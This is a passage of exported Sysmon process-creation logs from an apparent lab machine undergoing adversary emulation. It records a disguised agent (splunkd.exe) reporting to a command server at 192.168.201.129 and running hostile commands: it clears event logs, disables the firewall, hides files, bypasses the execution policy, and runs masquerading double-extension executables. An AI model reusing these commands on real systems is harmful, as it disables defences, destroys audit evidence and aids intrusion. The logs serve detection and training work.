C:\Windows\System32\cmd.exe ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:14.431","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.437 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172637,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.428","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.796 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172640,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-process ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.792","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.276 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172642,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localgroup ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.275","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.625 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172644,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localuser ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.624","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.905 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172646,"Cmdline: ""C:\Windows\Temp\debug.exe"" Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.904","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:19.904 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172648,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 7464 ¦ PGUID: E9F06A57-9443-694A-B802-000000002300 ¦ ParentPID: 1340 ¦ ParentPGUID: E9F06A57-7C75-694A-1A00-000000002300 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:08:19.896","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:56.533 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172649,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Clear-Eventlog Security;Clear-Eventlog System;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8508 ¦ PGUID: E9F06A57-9468-694A-B902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:08:56.521","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:33.546 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172651,"Cmdline: cmd.exe /C netsh advfirewall set currentprofile state off ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1668 ¦ PGUID: E9F06A57-948D-694A-BA02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:09:33.537","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:33.582 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172652,"Cmdline: netsh advfirewall set currentprofile state off ¦ Proc: C:\Windows\System32\netsh.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C netsh advfirewall set currentprofile state off ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6052 ¦ PGUID: E9F06A57-948D-694A-BB02-000000002300 ¦ ParentPID: 1668 ¦ ParentPGUID: E9F06A57-948D-694A-BA02-000000002300 ¦ Description: Network Command Shell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=12AD15E6AB0F8C8830F1F600381F204A,SHA256=69AE00A67DCE3C75A810408B1424D2901A6E08B37FD16C9DA87D1B5874B13DD6,IMPHASH=251873EE5CC9E54F8BB552E4F6FDBD14","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: netsh.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:09:33.577","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:33.964 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172654,"Cmdline: C:\WINDOWS\system32\svchost.exe -k NetworkServiceNetworkRestricted -p ¦ Proc: C:\Windows\System32\svchost.exe ¦ User: NT AUTHORITY\NETWORK SERVICE ¦ ParentCmdline: C:\WINDOWS\system32\services.exe ¦ LID: 0x3e4 ¦ LGUID: E9F06A57-7C73-694A-E403-000000000000 ¦ PID: 8768 ¦ PGUID: E9F06A57-948D-694A-BC02-000000002300 ¦ ParentPID: 776 ¦ ParentPGUID: E9F06A57-7C72-694A-0B00-000000002300 ¦ Description: Host Process for Windows Services ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0CD128F416A04C06D50EC56392C25D9F,SHA256=324451797AC909A4DD40C7A2F7347EF91F6B7C786941AD5035F609C0FC15EDAA,IMPHASH=DE43BD45CC98C143357416C7519ECCFD","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: svchost.exe ¦ ParentImage: C:\Windows\System32\services.exe ¦ ParentUser: NT AUTHORITY\SYSTEM ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:09:33.956","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:34.015 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172655,"Cmdline: C:\WINDOWS\system32\svchost.exe -k GPSvcGroup ¦ Proc: C:\Windows\System32\svchost.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\services.exe ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 8416 ¦ PGUID: E9F06A57-948E-694A-BD02-000000002300 ¦ ParentPID: 776 ¦ ParentPGUID: E9F06A57-7C72-694A-0B00-000000002300 ¦ Description: Host Process for Windows Services ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0CD128F416A04C06D50EC56392C25D9F,SHA256=324451797AC909A4DD40C7A2F7347EF91F6B7C786941AD5035F609C0FC15EDAA,IMPHASH=DE43BD45CC98C143357416C7519ECCFD","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: svchost.exe ¦ ParentImage: C:\Windows\System32\services.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:09:34.013","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:34.166 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172656,"Cmdline: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding ¦ Proc: C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthHost.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k DcomLaunch -p ¦ LID: 0x18bef ¦ LGUID: E9F06A57-7C75-694A-EF8B-010000000000 ¦ PID: 8280 ¦ PGUID: E9F06A57-948E-694A-BE02-000000002300 ¦ ParentPID: 912 ¦ ParentPGUID: E9F06A57-7C73-694A-0D00-000000002300 ¦ Description: Windows Security Health Host ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=6A1C7F240C04965EA3627ADA46E890DB,SHA256=4DAAC737340C506314BF4B5FA7979FBA68E0F9E22093F9EC50CAF647542A113F,IMPHASH=E8960CAF12CF621B3CA78988264C27F1","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.29429.1000 (WinBuild.160101.0800) ¦ IntegrityLevel: Medium ¦ OriginalFileName: SecurityHealthHost.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ ParentUser: NT AUTHORITY\SYSTEM ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:09:34.158","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:34.323 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172657,"Cmdline: C:\Windows\System32\smartscreen.exe -Embedding ¦ Proc: C:\Windows\System32\smartscreen.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k DcomLaunch -p ¦ LID: 0x18bef ¦ LGUID: E9F06A57-7C75-694A-EF8B-010000000000 ¦ PID: 544 ¦ PGUID: E9F06A57-948E-694A-BF02-000000002300 ¦ ParentPID: 912 ¦ ParentPGUID: E9F06A57-7C73-694A-0D00-000000002300 ¦ Description: Windows Defender SmartScreen ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=1908AE540D62E7A6BEF08EDF2AE9FD3B,SHA256=7129DBF9435FF3087661F80B6DE322CA4286BC1089CB5B5C988C6FEEC965C91E,IMPHASH=C84171DF6E7F087EA4E625CCCE2AB167","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: Medium ¦ OriginalFileName: smartscreen.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ ParentUser: NT AUTHORITY\SYSTEM ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:09:34.300","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:10:31.609 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172658,"Cmdline: cmd.exe /C attrib.exe +h %%temp%%\T1564.001.txt ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3564 ¦ PGUID: E9F06A57-94C7-694A-C102-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:10:31.583","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:10:31.637 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172659,"Cmdline: attrib.exe +h C:\Users\student\AppData\Local\Temp\T1564.001.txt ¦ Proc: C:\Windows\System32\attrib.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C attrib.exe +h %temp%\T1564.001.txt ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6508 ¦ PGUID: E9F06A57-94C7-694A-C202-000000002300 ¦ ParentPID: 3564 ¦ ParentPGUID: E9F06A57-94C7-694A-C102-000000002300 ¦ Description: Attribute Utility ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=2C94221BE86CD3F24B77560B031CCE6D,SHA256=064181108CD8D7F110CC11B84DBF2D7F18FD5F52A2EE989985D88A969F093DBE,IMPHASH=2CB38FE7D8F223D9DA50B7CBA9B95A6D","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: ATTRIB.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:10:31.633","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:11:33.616 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172660,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4932 ¦ PGUID: E9F06A57-9505-694A-C302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:11:33.610","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.707 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172664,"Cmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.rtf.ps1 /Y && %%temp%%\T1036.007_masquerading.docx.exe && %%temp%%\T1036.007_masquerading.pdf.exe && %%temp%%\T1036.007_masquerading.ps1.exe && %%temp%%\T1036.007_masquerading.xls.vbs && %%temp%%\T1036.007_masquerading.xlsx.vbs && %%temp%%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:37.680","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
